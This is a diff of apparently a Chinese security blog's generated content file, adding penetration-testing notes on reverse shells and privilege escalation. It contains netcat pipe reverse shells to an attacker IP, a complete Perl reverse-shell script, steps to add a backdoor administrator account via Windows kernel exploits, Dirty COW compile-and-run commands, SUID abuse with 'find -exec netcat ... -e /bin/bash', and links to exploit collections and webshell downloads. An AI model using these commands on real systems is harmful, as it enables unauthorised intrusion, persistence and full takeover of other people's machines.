@@ -64,13 +64,13 @@
 <li>如果目标机上nc不支持-e选项（linux中使用管道符）<ol>
 <li>攻击机上监听： <code>nc -nlvp 1234</code><pre><code>`nc -nlvp 4321`</code></pre></li>
 <li>目标机上连接：<code>nc 攻击机ip 1234|/bin/bash|nc 攻击机ip 4321</code></li>
-<li>然后在攻击机上监听1234的终端执行命令，攻击机监听4321的终端上将会输出目标机的执行结果<h3 id="2-perl脚本工具"><a href="#2-perl脚本工具" class="headerlink" title="2.perl脚本工具"></a>2.perl脚本工具</h3></li>
+<li>然后在攻击机上监听1234的终端执行命令，攻击机监听4321的终端上将会输出目标机的执行结果</li>
 </ol>
 </li>
 </ul>
 </li>
 </ul>
-<p><strong>适用于目标机为Linux但无nc工具</strong></p>
+<h3 id="2-perl脚本工具"><a href="#2-perl脚本工具" class="headerlink" title="2.perl脚本工具"></a>2.perl脚本工具</h3><p><strong>适用于目标机为Linux但无nc工具</strong></p>
 <ol>
 <li>上传ft.pl脚本<br>脚本内容<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w    </span></span><br><span class="line"><span class="comment">#    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;    </span><br><span class="line"><span class="keyword">use</span> Socket;    </span><br><span class="line"><span class="keyword">use</span> IO::Handle;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($#ARGV+<span class="number">1</span> != <span class="number">2</span>)&#123;    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$#ARGV $0 Remote_IP Remote_Port \n"</span>;    </span><br><span class="line">        <span class="keyword">exit</span> <span class="number">1</span>;    </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $remote_ip = $ARGV[<span class="number">0</span>];    </span><br><span class="line"><span class="keyword">my</span> $remote_port = $ARGV[<span class="number">1</span>];    </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $proto = <span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>);    </span><br><span class="line"><span class="keyword">my</span> $pack_addr = sockaddr_in($remote_port, inet_aton($remote_ip));    </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $shell = <span class="string">'/bin/bash -i'</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">socket</span>(SOCK, AF_INET, SOCK_STREAM, $proto);    </span><br><span class="line"></span><br><span class="line">STDOUT-&gt;autoflush(<span class="number">1</span>);    </span><br><span class="line">SOCK-&gt;autoflush(<span class="number">1</span>);    </span><br><span class="line"></span><br><span class="line"><span class="keyword">connect</span>(SOCK,$pack_addr) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"can not connect:$!"</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span> STDIN, <span class="string">"&lt;&amp;SOCK"</span>;    </span><br><span class="line"><span class="keyword">open</span> STDOUT, <span class="string">"&gt;&amp;SOCK"</span>;    </span><br><span class="line"><span class="keyword">open</span> STDERR, <span class="string">"&gt;&amp;SOCK"</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Enjoy the shell.\n"</span>;              </span><br><span class="line"></span><br><span class="line"><span class="keyword">system</span>($shell);    </span><br><span class="line"><span class="keyword">close</span> SOCK;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
 <li>加上执行权限:<code>chmod u+x ft.pl</code></li>
@@ -123,14 +123,134 @@
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="提权与后门维持"><a href="#提权与后门维持" class="headerlink" title="提权与后门维持"></a>提权与后门维持</h1><ul>
 <li>拿下网站!=拿下网站服务器；<br>  拿下网站=获得webshell，拿下网站服务器=拿下root（system）权限<br>  拿下网站服务器也不一定拿下网站，可能站库分离，有单独的数据库服务器</li>
 <li>网站webshell权限解析：<br>  一般情况下，webshell权限介于guests-users之间，权限较小<br>  非一般情况下，由以下两点决定：<ol>
-<li>脚本类型<br>asp、php（小于users，匿名权限）&lt; aspx（users）&lt; jsp(system)</li>
-<li>搭建工具<br> phpstudy，lamp,apmserv第三方软件等</li>
+<li>脚本类型<br><strong>asp、php（小于users，匿名权限）&lt; aspx（users）&lt; jsp(system)</strong></li>
+<li>搭建工具<br><strong>phpstudy，lamp,apmserv第三方软件等</strong></li>
 </ol>
 </li>
+<li>POC、EXP<ul>
+<li>POC：概念验证；常指一段漏洞验证的代码，证明漏洞是否存在，无害。</li>
+<li>EXP：利用；指利用系统漏洞进行攻击的代码，有害。</li>
+<li>有了POC才有EXP；每个漏洞都由自己的EXP，不存在通用的EXP。</li>
 </ul>
-<h2 id="一-提权"><a href="#一-提权" class="headerlink" title="一.提权"></a>一.提权</h2><p><em>前提：已获取低权shell</em></p>
+</li>
+</ul>
+<h2 id="一-前期工作-信息收集"><a href="#一-前期工作-信息收集" class="headerlink" title="一.前期工作-信息收集"></a>一.前期工作-信息收集</h2><ul>
+<li>内外网</li>
+<li>服务系统和版本位数</li>
+<li>服务器的补丁情况</li>
+<li>服务器的安装软件情况</li>
+<li>服务器的防护软件情况</li>
+<li>端口情况</li>
+<li>所支持的脚本情况</li>
+</ul>
+<p><em>详细命令参考内网渗透笔记</em></p>
+<h2 id="二-提权"><a href="#二-提权" class="headerlink" title="二.提权"></a>二.提权</h2><p><em>前提：已获取低权shell</em></p>
 <h3 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h3><ul>
 <li>参考msf后渗透一文中的提权模块</li>
+</ul>
+<h3 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
+<li>提权EXP一般格式为 MS08067.exe或 .com（cmd下执行）</li>
+<li>EXP选择：使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。（可使用辅助工具脚本）</li>
+<li>前提：已获取到shell</li>
+</ul>
+<h5 id="cmd可执行"><a href="#cmd可执行" class="headerlink" title="cmd可执行"></a>cmd可执行</h5><h6 id="使用特定exp"><a href="#使用特定exp" class="headerlink" title="使用特定exp"></a>使用特定exp</h6><ol>
+<li>通过systeminfo获取补丁安装情况获取可用提权exp</li>
+<li>在可读可写的目录（不要含空格，一般是回收站）上传提权exp</li>
+<li>使用exp提权<ul>
+<li><code>exp.exe &quot;whoami&quot;</code>查看提权结果是否成功</li>
+<li><code>exp.exe &quot;net user hack hack123 /add&quot;</code>添加用户</li>
+<li><code>exp.exe &quot;net localgroup administrators hack /add</code>添加用户到管理员组</li>
+<li>使用rdp远程登录到目标主机<ul>
+<li>如果没有开放rdp服务，使用.exe .bat .vbs等脚本开启</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h6 id="使用pr提权"><a href="#使用pr提权" class="headerlink" title="使用pr提权"></a>使用pr提权</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft Windows RPCSS服务隔离本地权限提升漏洞</span><br><span class="line"></span><br><span class="line">RPCSS服务没有正确地隔离 NetworkService 或 LocalService 帐号下运行的进程，本地攻击者可以利用令牌劫持的方式获得权限提升。成功利用此漏洞的攻击者可以完全控制受影响的系统，攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。</span><br><span class="line">BUGTRAQ ID: 34443</span><br><span class="line">CVE(CAN) ID: CVE-2009-0079</span><br><span class="line"></span><br><span class="line">发布日期：2009-04-14</span><br><span class="line">更新日期：2009-04-24</span><br><span class="line"></span><br><span class="line">受影响系统：</span><br><span class="line">Microsoft Windows XP x64 SP2</span><br><span class="line">Microsoft Windows XP x64</span><br><span class="line">Microsoft Windows XP SP3</span><br><span class="line">Microsoft Windows XP SP2</span><br><span class="line">Microsoft Windows Server 2003 SP2</span><br><span class="line">Microsoft Windows Server 2003 SP1</span><br></pre></td></tr></table></figure>
+<p>步骤与特定exp提权类似</p>
+<h5 id="cmd命令无法执行"><a href="#cmd命令无法执行" class="headerlink" title="cmd命令无法执行"></a>cmd命令无法执行</h5><ul>
+<li>原因：<ul>
+<li>组件被禁用或删除（wscript.shell）</li>
+<li>cmd被降权或删除</li>
+<li>防护软件拦截</li>
+</ul>
+</li>
+<li>解决<ul>
+<li>被拦截和降权：找可读可写目录，上传cmd.exe,调用上传的cmd.exe，执行cmd.exe命令（使用绝对目录）</li>
+<li>组件被删除：检查是否支持aspx，如果支持aspx，可以通过aspx大马直接调用系统的cmd，<a href="http://www.mumaasp.com/" target="_blank" rel="noopener">asp大马脚本下载</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
+<li>提权exp一般按照内核版本来命名，格式为2.6.18-194或2.6.18.c（需要gcc编译后使用）</li>
+</ul>
+<h5 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h5><ul>
+<li>信息收集得到Linux版本<code>cat /etc/issus</code> <code>uname -a</code></li>
+<li>寻找对应版本漏洞的exp<ul>
+<li>漏洞库手动查找：<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">Linux</a></li>
+<li>kali里使用<code>searchsploit</code>搜索对应内核漏洞：<code>searchsploit linux 版本号</code> <code>searchsploit Ubuntu（发行版） 16 kernel 内核版本号</code></li>
+<li>将exp上传到目标机或者使用wget，scp（ssh已开启）命令</li>
+<li>编译exp<code>gcc exp(.c) -o exp可执行文件名</code></li>
+<li>执行<code>./exp可执行文件名</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h5><ul>
+<li>exp下载地址：<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">dirty.c</a></li>
+<li>将exp上传到目标机，或者目标机使用wget下载exp</li>
+<li>编译exp文件<code>gcc -pthread dirty.c -o dirty -lcrypt</code></li>
+<li>执行exp<code>./dirty my-new-password</code></li>
+</ul>
+<h4 id="自动探测漏洞"><a href="#自动探测漏洞" class="headerlink" title="自动探测漏洞"></a>自动探测漏洞</h4><ul>
+<li><p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">windos脚本地址</a></p>
+<ul>
+<li>使用方法：<ul>
+<li>更新数据库，生成漏洞对应编号的表格。<br><code>python2 windows-exploit-suggester.py --update</code></li>
+<li>安装必要的依赖xlrd<br><code>pip install xlrd --upgrade</code></li>
+<li>将 xx.txt 作为参数传给脚本<br><code>python windows-exploit-suggester.py --database 2020-xx.xls --systeminfo xx.txt</code><br>2020-xx.xls为生成的漏洞对应编号的表格；xx.txt为在靶机上执行systeminfo后的信息并保存在txt文档中</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><a href="https://github.com/jondonas/linux-Exploit-Suggester-2" target="_blank" rel="noopener">linux脚本地址</a></p>
+</li>
+<li><p><code>post/multi/recon/local_exploit_suggester</code> msf后渗透自动探测模块</p>
+</li>
+</ul>
+<hr>
+<h4 id="提权辅助资料"><a href="#提权辅助资料" class="headerlink" title="提权辅助资料"></a>提权辅助资料</h4><ul>
+<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">Windows系统溢出漏洞exp提权汇总</a></li>
+<li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux系统溢出漏洞exp提权汇总</a></li>
+<li><a href="https://github.com/vulmon/Vulmap/" target="_blank" rel="noopener">本地联网漏扫vulmap</a></li>
+<li><a href="http://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助网页</a></li>
+<li><a href="https://detect.secwx.com/" target="_blank" rel="noopener">在线提权漏洞检测平台</a></li>
+<li><a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener">BeRoot</a></li>
+</ul>
+<h3 id="中间件提权"><a href="#中间件提权" class="headerlink" title="中间件提权"></a>中间件提权</h3><ul>
+<li>iis6.0<ul>
+<li>通过漏洞cve-2017-7269获取shell</li>
+<li>使用exp：iis62.exe提权</li>
+</ul>
+</li>
+</ul>
+<h3 id="Linux-SUID提权"><a href="#Linux-SUID提权" class="headerlink" title="Linux SUID提权"></a>Linux SUID提权</h3><ul>
+<li>SUID：在可执行文件的执行位上，具有SUID权限执行的时候具有所有者的身份</li>
+<li>寻找root用户具有SUID权限的文件:<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><ul>
+<li>nmap提权(2.02-5.21)<ul>
+<li>启动交互模式:<code>nmap --interactive</code></li>
+<li><code>!sh</code>，进入</li>
+</ul>
+</li>
+<li>find提权<ul>
+<li>创建一个文件<code>touch test</code></li>
+<li>攻击机nc监听<code>nc -nlvp 1234</code></li>
+<li>目标机上执行<code>find test -exec netcat 攻击机ip 1234 -e /bin/bash \;</code>获得反弹shell</li>
+</ul>
+</li>
+<li>查找到的可执行文件使用搜索引擎逐一搜索是否存在提权漏洞</li>
+</ul>
+</li>
 </ul>
 ]]></content>
       <categories>
@@ -308,7 +428,7 @@
 dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a href="#操作系统机软件信息" class="headerlink" title="操作系统机软件信息"></a>操作系统机软件信息</h5><h6 id="操作系统和版本信息"><a href="#操作系统和版本信息" class="headerlink" title="操作系统和版本信息"></a>操作系统和版本信息</h6><ul>
 <li><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C &quot;OS Version&quot;</code></li>
 <li><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></li>
-<li>linux:<code>uname -a</code><h6 id="安装的软件及版本"><a href="#安装的软件及版本" class="headerlink" title="安装的软件及版本"></a>安装的软件及版本</h6></li>
+<li>linux:<code>uname -a</code> <code>cat /etc/issue</code><h6 id="安装的软件及版本"><a href="#安装的软件及版本" class="headerlink" title="安装的软件及版本"></a>安装的软件及版本</h6></li>
 <li><code>wmic product get name,version</code></li>
 <li><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></li>
 <li>linux:<code>rpm -qa</code><h5 id="查询本机服务"><a href="#查询本机服务" class="headerlink" title="查询本机服务"></a>查询本机服务</h5></li>
